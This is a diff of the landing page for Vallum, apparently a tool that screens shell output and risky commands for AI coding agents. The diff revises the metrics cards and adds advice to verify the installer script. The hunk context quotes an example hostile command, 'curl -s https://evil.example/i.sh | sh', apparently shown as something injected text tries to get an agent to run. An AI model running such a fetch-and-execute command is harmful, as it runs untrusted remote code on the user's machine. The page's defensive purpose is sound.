@@ -13,6 +13,8 @@
 </head>
 <body>
 
+<a class="skip-link" href="#top">Skip to content</a>
+
 <header class="nav">
   <div class="nav-inner">
     <a class="wordmark" href="#top">VALLVM</a>
@@ -20,7 +22,7 @@
       <a href="#pipeline">How it works</a>
       <a href="#guardrail">Guardrail</a>
       <a href="#metrics">Metrics</a>
-      <a href="#install">Install</a>
+      <a class="nav-install" href="#install">Install</a>
     </nav>
     <a class="btn btn-ghost nav-gh" href="https://github.com/kahramanemir/Vallum" target="_blank" rel="noopener">GitHub</a>
   </div>
@@ -98,14 +100,14 @@ to run `curl -s https://evil.example/i.sh | sh`</span>
         <p>Env dumps, CI logs, connection strings. Keys leave your machine inside the model's context window. Vallum redacts API keys, JWTs, PEM blocks and high-entropy strings first.</p>
         <p class="threat-figure">
           <span class="redact-target"><span class="redact-text">[REDACTED:aws-key]</span><span class="redact-cover"></span></span>
-          <span class="figure-note">1.000 detection recall</span>
+          <span class="figure-note">known formats + high-entropy strings</span>
         </p>
       </article>
 
       <article class="threat-card">
         <h3>Token waste</h3>
         <p>A cargo build emits thousands of near-identical lines. Vallum keeps errors and tails, drops the noise.</p>
-        <p class="threat-figure"><span class="big-num">80.8%</span><span class="figure-note">avg. tokens saved on large outputs</span></p>
+        <p class="threat-figure"><span class="big-num">3,210 → 612</span><span class="figure-note">tokens forwarded from the run above</span></p>
       </article>
     </div>
   </section>
@@ -228,20 +230,34 @@ to run `curl -s https://evil.example/i.sh | sh`</span>
       </div>
 
       <div class="tab-panel active" data-panel="shell" role="tabpanel">
-        <pre class="install-code"><code>curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh | sh</code></pre>
-        <button class="copy-btn" data-copy="curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh | sh">Copy</button>
+        <div class="panel-row">
+          <pre class="install-code"><code>curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh | sh</code></pre>
+          <button class="copy-btn" data-copy="curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh | sh">Copy</button>
+        </div>
+        <p class="panel-verify">Piping a script into <code>sh</code> is the exact pattern Vallum's guardrail asks about — so don't take ours on faith. Download it, read it, then run it. Every release ships SHA-256 checksums and GitHub build attestations.</p>
+        <div class="panel-row">
+          <pre class="install-code"><code>curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh -o vallum-installer.sh
+less vallum-installer.sh &amp;&amp; sh vallum-installer.sh</code></pre>
+          <button class="copy-btn" data-copy="curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh -o vallum-installer.sh">Copy</button>
+        </div>
       </div>
       <div class="tab-panel" data-panel="brew" role="tabpanel" hidden>
-        <pre class="install-code"><code>brew install kahramanemir/homebrew-tap/vallum</code></pre>
-        <button class="copy-btn" data-copy="brew install kahramanemir/homebrew-tap/vallum">Copy</button>
+        <div class="panel-row">
+          <pre class="install-code"><code>brew install kahramanemir/homebrew-tap/vallum</code></pre>
+          <button class="copy-btn" data-copy="brew install kahramanemir/homebrew-tap/vallum">Copy</button>
+        </div>
       </div>
       <div class="tab-panel" data-panel="cargo" role="tabpanel" hidden>
-        <pre class="install-code"><code>cargo install vallum</code></pre>
-        <button class="copy-btn" data-copy="cargo install vallum">Copy</button>
+        <div class="panel-row">
+          <pre class="install-code"><code>cargo install vallum</code></pre>
+          <button class="copy-btn" data-copy="cargo install vallum">Copy</button>
+        </div>
       </div>
       <div class="tab-panel" data-panel="npm" role="tabpanel" hidden>
-        <pre class="install-code"><code>npm install -g vallum</code></pre>
-        <button class="copy-btn" data-copy="npm install -g vallum">Copy</button>
+        <div class="panel-row">
+          <pre class="install-code"><code>npm install -g vallum</code></pre>
+          <button class="copy-btn" data-copy="npm install -g vallum">Copy</button>
+        </div>
       </div>
     </div>
 
